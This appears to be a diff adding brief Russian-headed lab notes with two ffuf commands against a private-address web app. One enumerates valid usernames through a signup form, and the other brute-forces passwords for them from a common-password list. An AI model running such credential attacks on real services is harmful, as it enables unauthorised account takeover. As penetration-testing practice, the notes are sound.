@@ -1,0 +1,8 @@
+Перечисление
+
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt      -X POST      -d "username=FUZZ&email=&password=&cpassword="      -H "Content-Type: application/x-www-form-urlencoded"      -u http://10.82.183.177/customers/signup      -mr "username already exists"      -o valid_usernames.txt
+
+
+Перебор паролей
+
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.82.183.177/customers/login -fc 200
